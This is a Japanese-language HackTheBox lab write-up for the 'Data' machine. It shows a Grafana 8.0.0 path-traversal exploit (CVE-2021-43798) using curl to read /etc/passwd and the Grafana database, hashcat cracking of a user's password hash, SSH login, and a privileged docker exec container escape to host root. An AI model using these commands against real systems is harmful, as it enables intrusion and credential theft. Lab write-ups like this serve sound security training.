---
title: 'Data'
description: 'HackTheBox MachineのWriteup'
pubDate: 2026-03-06T22:00:00+09:00
category: 'HTB'
tags: ['HTB Machine', 'Writeup', 'Linux', 'Grafana', 'CVE-2021-43798', 'Docker']
---

# Data - HackTheBox

## Initial Access
### Port Scanning

```bash
nmap 10.129.234.47 -Pn -p 3000 -A

3000/tcp open  http    Grafana http
| http-robots.txt: 1 disallowed entry
|_/
| http-title: Grafana
|_Requested resource was /login
|_http-trane-info: Problem with XML parsing of /evox/about
```

### Web Enumeration
```bash
$ whatweb http://10.129.234.47:3000/
http://10.129.234.47:3000/login [200 OK] Country[RESERVED][ZZ], Grafana[8.0.0], HTML5, IP[10.129.234.47], Script[text/javascript], Title[Grafana], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block]
```

### Grafana 8.0.0 Vuln
既知の脆弱性: [CVE-2021-43798](https://github.com/jas502n/Grafana-CVE-2021-43798)

ディレクトリ調査結果から  
`http://10.129.234.47:3000/public/`

```bash
curl --path-as-is "http://10.129.234.47:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"

root:x:0:0:root:/root:/bin/ash
~~~
nobody:x:65534:65534:nobody:/:/sbin/nologin
grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin
```

```bash
curl --path-as-is "http://10.129.234.47:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db" --output grafana.db
```

### Password Cracking
```bash
sqlite> select * from user;
1|0|admin|admin@localhost||7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S|hLLY6QQ4Y6||1|1|0||2022-01-23 12:48:04|2022-01-23 12:48:50|0|2022-01-23 12:48:50|0
2|0|boris|boris@data.vl|boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl|mYl941ma8w||1|0|0||2022-01-23 12:49:11|2022-01-23 12:49:11|0|2012-01-23 12:49:11|0
```

#### Grafana Hash
[Grafana2Hashcat](https://github.com/iamaldi/grafana2hashcat/tree/main)

```bash
$ echo "dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8,LCBhdtJWjl" > hash.txt
```

```bash
$ python3 grafana2hashcat.py hash.txt

[+] Grafana2Hashcat
[+] Reading Grafana hashes from:  hash.txt
[+] Done! Read 1 hashes in total.
[+] Converting hashes...
[+] Converting hashes complete.
[*] Outfile was not declared, printing output to stdout instead.

sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=


[+] Now, you can run Hashcat with the following command, for example:

hashcat -m 10900 hashcat_hashes.txt --wordlist wordlist.txt
```

```bash
echo "sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=" > hashcat_hashes.txt
```

```bash
hashcat -m 10900 hashcat_hashes.txt --wordlist /usr/share/wordlists/rockyou.txt

sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1
```

### SSH Login
```bash
$ ssh boris@10.129.234.47 # beautiful1

boris@data:~$ ls
user.txt
```

## Privilege Escalation
```bash
boris@data:~$ sudo -l
Matching Defaults entries for boris on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User boris may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *
```

```bash
boris@data:~$ ps aux | grep docker
root      1040  0.1  4.0 1422500 82188 ?       Ssl  10:35   0:06 dockerd --group docker --exec-root=/run/snap.docker --data-root=/var/snap/docker/common/var-lib-docker --pidfile=/run/snap.docker/docker.pid --config-file=/var/snap/docker/1125/config/daemon.json
root      1221  0.1  2.1 1351056 44428 ?       Ssl  10:35   0:04 containerd --config /run/snap.docker/containerd/containerd.toml --log-level error
root      1555  0.0  0.1 1152456 3324 ?        Sl   10:35   0:00 /snap/docker/1125/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 3000 -container-ip 172.17.0.2 -container-port 3000
root      1561  0.0  0.1 1152456 3316 ?        Sl   10:35   0:00 /snap/docker/1125/bin/docker-proxy -proto tcp -host-ip :: -host-port 3000 -container-ip 172.17.0.2 -container-port 3000
root      1575  0.0  0.4 712864  8276 ?        Sl   10:35   0:01 /snap/docker/1125/bin/containerd-shim-runc-v2 -namespace moby -id e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 -address /run/snap.docker/containerd/containerd.sock
472       1608  0.3  3.3 849624 67256 ?        Ssl  10:35   0:17 grafana-server --homepath=/usr/share/grafana --config=/etc/grafana/grafana.ini --packaging=docker cfg:default.log.mode=console cfg:default.paths.data=/var/lib/grafana cfg:default.paths.logs=/var/log/grafana cfg:default.paths.plugins=/var/lib/grafana/plugins cfg:default.paths.provisioning=/etc/grafana/provisioning
boris    14302  0.0  0.0  14860  1036 pts/0    S+   11:51   0:00 grep --color=auto docker
```

```bash
boris@data:~$ sudo /snap/bin/docker exec -it e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 /bin/bash
bash-5.1$ id
uid=472(grafana) gid=0(root) groups=0(root)
```

### Privileged Container Escape

普通にコンテナプロセスにアクセスするとカーネルへのアクセスが制限される  
しかし、privileged をつけると制限なし(ホストrootと同様)カーネルへの制限もなくなる

/dev/sda* も見えるようになりコンテナ内で mount することでホストのルートパーティションにアクセスできる

```bash
boris@data:~$ mount
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs (rw,nosuid,relatime,size=1001016k,nr_inodes=250254,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=203120k,mode=755)
/dev/sda1 on / type ext4 (rw,relatime)
~~~
```
```bash
boris@data:~$ sudo /snap/bin/docker exec -u 0 --privileged -it e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 /bin/bash

bash-5.1# mkdir /mnt/host
bash-5.1# mount /dev/sda1 /mnt/host
bash-5.1# ls /mnt/host/root
root.txt  snap
```
chrootで見やすくするのもあり
```bash
bash-5.1# chroot /mnt/host/ /bin/bash
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@e6ff5b1cbc85:/# ls /root
root.txt  snap
```